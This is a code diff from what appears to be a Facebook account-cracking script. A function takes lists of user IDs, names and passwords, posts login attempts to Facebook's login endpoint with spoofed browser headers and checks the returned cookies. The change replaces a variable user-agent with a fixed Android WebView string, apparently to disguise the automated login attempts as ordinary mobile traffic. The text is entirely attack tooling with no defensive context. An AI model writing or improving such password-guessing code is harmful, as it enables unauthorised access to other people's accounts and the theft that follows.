@@ -1559,7 +1559,7 @@ def __MTDSIX__(ids, names, passlist, total_ids):
             'sec-fetch-site': 'same-origin',
             'sec-fetch-user': '?1',
             'upgrade-insecure-requests': '1',
-            'user-agent': pro,
+            'user-agent': 'Mozilla/5.0 (Linux; Android 13; SM-N986B Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/117.0.0.0 Mobile Safari/537.36',
             'viewport-width': '980',}
             lo = session.post('https://www.facebook.com/login/device-based/regular/login/?refsrc=deprecated&lwv=111&refid=8',data=data,headers=headers).text
             log_cookies=session.cookies.get_dict().keys()
